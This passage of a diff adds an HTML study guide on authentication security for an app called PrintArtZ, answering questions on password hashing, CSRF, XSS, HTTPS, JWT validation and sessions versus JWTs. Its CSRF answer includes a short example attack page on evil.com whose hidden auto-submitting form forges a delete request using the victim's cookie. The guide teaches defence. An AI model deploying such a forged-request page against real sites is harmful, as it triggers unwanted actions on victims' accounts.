+              <p>Both are deliberately <strong>slow, adaptive</strong> password hashes. The <strong>work factor</strong> (bcrypt's “cost”, Argon2's time/memory/parallelism parameters) is a tunable knob that makes hashing take a set amount of effort — you dial it up as hardware gets faster so a single guess stays expensive for attackers while remaining acceptable (tens of ms) for a real login.</p>
+              <div class="vs">
+                <div><h4>bcrypt</h4><p class="muted">Battle-tested since 1999, simple, widely available. CPU-hard via its cost factor. Limitation: caps input around 72 bytes and isn't memory-hard, so it's more vulnerable to GPU/ASIC cracking.</p></div>
+                <div><h4>Argon2</h4><p class="muted">Winner of the 2015 Password Hashing Competition; <strong>memory-hard</strong> (tunable RAM usage), which blunts GPU/ASIC attacks. <code>Argon2id</code> is the recommended variant. The current best-practice default for new systems.</p></div>
+              </div>
+              <p>Practical guidance: choose <strong>Argon2id</strong> for new projects; bcrypt remains perfectly acceptable and is a fine, well-supported choice. Either way, never use fast hashes (MD5/SHA) for passwords.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>What is CSRF and how do you defend against it?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p><strong>Cross-Site Request Forgery</strong> tricks a logged-in user's browser into making an unwanted state-changing request to a site where they're authenticated. Because the browser <em>automatically</em> attaches the session cookie, a hidden form or image on a malicious page can fire a request (say “transfer money” or “delete my design”) that the server can't distinguish from a legitimate one.</p>
+              <pre><code>&lt;!-- on evil.com: auto-submits using the victim's cookie --&gt;
+&lt;form action="https://printartz.app/api/delete" method="POST"&gt;
+  &lt;input type="hidden" name="id" value="42"&gt;
+&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
+              <p>The main defenses: <strong>SameSite cookies</strong> (<code>Lax</code>/<code>Strict</code> stop the cookie from being sent on cross-site POSTs), <strong>anti-CSRF tokens</strong> (an unguessable token the server issues and requires echoed back, which the attacker's page can't read due to same-origin policy), and checking the <code>Origin</code>/<code>Referer</code> header. Auth.js ships CSRF token protection for its sign-in/out endpoints and uses <code>SameSite=Lax</code> cookies, so PrintArtZ is covered on both fronts.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>What is XSS and how does it relate to stealing sessions?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p><strong>Cross-Site Scripting</strong> is when an attacker gets their JavaScript to run in the context of your page — for example by injecting a script through an unsanitized comment or profile field that other users then load. Once attacker code runs on your origin, it can do anything the user can: read the DOM, make authenticated requests, and read any JS-accessible storage.</p>
+              <p>Its link to sessions is direct: if the session token lives somewhere JavaScript can reach (like <code>localStorage</code>, or a non-<code>HttpOnly</code> cookie), XSS steals it instantly. Defenses are layered: <strong>output encoding / auto-escaping</strong> (React does this by default, which is why you avoid <code>dangerouslySetInnerHTML</code>), a strict <strong>Content-Security-Policy</strong> to limit what scripts can run, input validation, and putting the session in an <strong>HttpOnly cookie</strong> so even a successful XSS can't read the token. PrintArtZ benefits from React's escaping and Auth.js's HttpOnly cookie.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Compare</span>CSRF vs XSS — how are they different?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <div class="vs">
+                <div><h4>CSRF</h4><p class="muted">Abuses the <em>trust a site has in the user's browser</em> — it makes the victim's browser send a forged authenticated request. The attacker never sees the response or steals data; they just trigger an action. Fixed with SameSite + CSRF tokens.</p></div>
+                <div><h4>XSS</h4><p class="muted">Abuses the <em>trust a user has in a site</em> — it runs attacker JavaScript on your page, which can read data, tokens, and impersonate the user fully. Fixed with output encoding, CSP, and HttpOnly cookies.</p></div>
+              </div>
+              <p>One line that lands in interviews: <strong>CSRF makes the browser <em>do</em> something; XSS makes the browser <em>run</em> something.</strong> XSS is generally the more severe because arbitrary script execution can even bypass CSRF tokens by reading them.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>Why is HTTPS essential for authentication?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>HTTPS (TLS) encrypts traffic between the browser and server, which is non-negotiable for auth because otherwise credentials, session cookies, and tokens travel in <strong>plaintext</strong> that anyone on the network path — a rogue Wi-Fi hotspot, a compromised router — can read or modify. A sniffed session cookie is a complete account takeover.</p>
+              <p>Beyond confidentiality, TLS provides <strong>integrity</strong> (traffic can't be silently tampered with) and <strong>server authentication</strong> (the certificate proves you're really talking to printartz.app, thwarting man-in-the-middle attacks). It's also what makes the <code>Secure</code> cookie flag meaningful. In practice you enforce it everywhere: HTTPS-only, redirect HTTP to HTTPS, and add <strong>HSTS</strong> so browsers refuse to connect over plain HTTP at all.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Advanced</span>What are the most common authentication mistakes?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <ul>
+                <li><strong>Storing passwords poorly:</strong> plaintext, encryption, or fast hashes (MD5/SHA) instead of salted bcrypt/Argon2.</li>
+                <li><strong>Tokens in localStorage:</strong> exposing session credentials to XSS instead of using HttpOnly cookies.</li>
+                <li><strong>No revocation path:</strong> long-lived JWTs that can't be logged out or killed after compromise.</li>
+                <li><strong>Weak session hygiene:</strong> not rotating the session id after login (session fixation), no idle/absolute timeout, predictable ids.</li>
+                <li><strong>Missing CSRF protection</strong> on state-changing cookie-authenticated endpoints.</li>
+                <li><strong>Leaking info in errors:</strong> “user not found” vs “wrong password” lets attackers enumerate accounts — return a generic message.</li>
+                <li><strong>No rate limiting / lockout:</strong> allowing unlimited login and OTP attempts (brute force, credential stuffing).</li>
+                <li><strong>Trusting tokens without verifying:</strong> not checking a JWT's signature, <code>exp</code>, issuer, and audience.</li>
+              </ul>
+              <p>The meta-lesson: prefer a vetted library (like Auth.js) over hand-rolling, because it gets these details right by default.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Advanced</span>How would you validate a JWT you receive?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>Verifying a JWT is more than decoding it — you must cryptographically and semantically check it, or you're trusting attacker-supplied data. The essential steps:</p>
+              <ul>
+                <li><strong>Signature:</strong> verify it with the expected key and reject tokens whose <code>alg</code> you didn't expect — the infamous <code>alg: "none"</code> attack and RS256→HS256 confusion come from skipping this. Pin the algorithm.</li>
+                <li><strong>Expiry &amp; timing:</strong> check <code>exp</code> (not expired) and <code>nbf</code>/<code>iat</code> (not used too early).</li>
+                <li><strong>Issuer &amp; audience:</strong> confirm <code>iss</code> is the provider you trust and <code>aud</code> matches your client — an ID token minted for another app must be rejected.</li>
+                <li><strong>Claims:</strong> validate what you rely on (e.g. <code>email_verified: true</code>).</li>
+              </ul>
+              <p>For OIDC providers like Google you fetch their public signing keys from a <strong>JWKS</strong> endpoint (keyed by the token's <code>kid</code>) so key rotation just works. Auth.js performs all of this when it processes Google's ID token during PrintArtZ's callback.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Compare</span>Session cookies vs JWTs — final security trade-off recap.</span><span class="chev">▶</span></button>
+            <div class="body">
+              <div class="vs">
+                <div><h4>Server-side session cookie</h4><p class="muted">Opaque id + HttpOnly cookie. <strong>Revocable instantly</strong>, tiny footprint, no sensitive data in the browser, easy to change permissions. CSRF-relevant (mitigated by SameSite) and needs a session store/lookup.</p></div>
+                <div><h4>JWT</h4><p class="muted">Self-contained, no lookup, great for stateless APIs and microservices. But <strong>hard to revoke</strong>, larger, and dangerous if stored in localStorage or verified sloppily.</p></div>
+              </div>
+              <p>The balanced takeaway: for a user-facing web app where you want instant logout, changeable permissions, and minimal client-side exposure, <strong>database-backed session cookies are usually the safer choice</strong> — which is exactly why PrintArtZ pairs Auth.js with the Prisma adapter. Reach for JWTs when you specifically need stateless, cross-service tokens and can accept managing short lifetimes and revocation yourself.</p>
+            </div>
+          </div>
+        </section>
+      </div>
+
+      <footer>
+        <a href="../index.html">← Back to the training guide</a> · Auth &amp; OAuth study guide
+      </footer>
+    </div>
+    <script src="../tutorial.js"></script>
+  </body>
+</html>
